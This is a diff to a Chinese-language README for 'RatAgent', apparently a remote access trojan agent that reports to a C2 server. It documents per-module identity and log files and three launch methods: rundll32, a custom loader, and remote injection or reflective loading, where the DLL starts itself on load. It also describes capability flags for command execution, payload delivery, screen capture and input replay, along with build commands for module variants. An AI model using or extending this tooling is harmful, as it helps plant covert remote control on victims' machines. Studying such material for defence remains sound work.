@@ -98,24 +98,48 @@ MSBUILD = "C:/Program Files/Microsoft Visual Studio/18/Community/MSBuild/Current
 
 | 形态 | 入口 | 适用场景 | 身份/日志位置 |
 |---|---|---|---|
-| `RatAgent.exe` | `main()`（控制台） | 独立进程部署、调试、`--selftest` | CWD 下 `agent.id`；stdout |
-| `RatAgent.dll` | 导出 `Start`/`StartAgent` 等 | rundll32 宿主、被其他程序/注入器加载 | `%LOCALAPPDATA%\RatAgent\agent.id` + `agent.log`（可用 `id=`/`log=` 覆盖） |
+| `RatAgent.exe` | `main()`（控制台） | 独立进程部署、调试、`--selftest` | CWD 下 `<module>.id`；stdout |
+| `RatAgent.dll` | 导出 `Start`/`StartAgent` 等 | rundll32 宿主、被其他程序/注入器加载 | `%LOCALAPPDATA%\RatAgent\<module>.id` + `<module>.log`（可用 `id=`/`log=` 覆盖） |
 
 DLL 的三种用法（都支持 `-tcp` 切长连接；默认 beacon `127.0.0.1:8080`、轮询 5s）：
 
 ```
 :: 1) rundll32（Start 阻塞驻留，保证进程存活；Stop 可在另一个进程里触发跨进程停止事件）
 rundll32 RatAgent.dll,Start 127.0.0.1,8080,-s,5
-rundll32 RatAgent.dll,Stop  id=<agent.id 路径或 32 位 hex>
+rundll32 RatAgent.dll,Stop  id=<module>.id 路径或 32 位 hex>
 
 :: 2) 自己的加载器 / 宿主（同进程启停，可 FreeLibrary 卸载）
 LoadLibraryW(L"RatAgent.dll") → StartAgent("127.0.0.1,8080,-s,5") → … → StopAgent()
 
 :: 3) 注入 / 反射加载（远程 LoadLibrary，或手动映射；这类场景没有参数通道）
-::    本 DLL **加载即自启**：有 %LOCALAPPDATA%\RatAgent\autostart.args（或 %TEMP% 下同名
-::    文件）就用文件里的参数串；**没有该文件则用内置默认配置**（beacon 127.0.0.1:8080、
-::    轮询 5s；agent.id / 日志落 %LOCALAPPDATA%\RatAgent\）。
+::    本 DLL **加载即自启**：有 %LOCALAPPDATA%\RatAgent\<module>.autostart.args（或 %TEMP% 下
+::    同名文件）就用文件里的参数串；**没有该文件则用内置默认配置**（beacon 127.0.0.1:8080、
+::    轮询 5s；<module>.id / 日志落 %LOCALAPPDATA%\RatAgent\）。
 ```
+
+### 模块命名空间（同机多模块共存）
+
+同一份 `client/core` 可以编成多个**模块 agent**（`full` / `screen` / …）。它们在同一台机器上
+共存时各有自己的落盘物与 C2 侧标识——这是共存的**前提**，因为服务器按 `agent_id` 索引，
+`Registry.Register` 遇到 id 冲突会**踢掉旧会话**（两个模块共用一份 id 就会互相踢下线）：
+
+| 项 | 规则 |
+|---|---|
+| 模块名 | 编译期常量，见 [client/core/module_id.h](client/core/module_id.h)（`RAT_MODULE_ID`，默认 `full`） |
+| 身份 / 日志 / 自启参数 | `%LOCALAPPDATA%\RatAgent\<module>.id` / `<module>.log` / `<module>.autostart.args` |
+| 停止事件 | `Local\RatAgentStop.<agent_id_hex>`（**刻意不带模块前缀**：各模块 id 随机不撞名，这样任一模块的 DLL 都能停任意模块的实例） |
+| C2 侧标签 | 握手 `os_info` = `Windows (<module>)`（TCP 信道）；能力位走 `plugins` 位图 |
+| 能力位 | `bit0` 系统类（sysinfo/exec/payload）、`bit1` 远程桌面（抓屏/流/输入回放） |
+
+```
+:: 同一工程出不同模块（默认 full；新模块工程应把这两个值写死成自己的）
+"%MSBUILD%" client/RatAgent.vcxproj -p:Configuration=Release -p:Platform=x64 ^
+    -p:RatAgentModuleId=probe "-p:RatAgentModuleCaps=(c2::kCapSys)" ...
+```
+
+> ⚠ 已知缺口：**beacon 信道的会话在服务端是硬编码 `OSInfo="beacon-agent"` 的**，握手元数据
+> （os/plugins）只走 TCP 长连接的 HELLO。所以模块标签目前只在 `-tcp` 模式下可见；
+> beacon 侧要带标签需要一次小的协议补充（计划中，尚未实现）。
 
 > ⚠ **加载即自启的副作用**：自启在 DllMain 之后的新线程上**延迟 300ms** 执行，而显式入口
 > （rundll32 的 `Start`/`Stop`、宿主的 `StartAgent`）是加载完成后立即调用的，两者存在竞争。
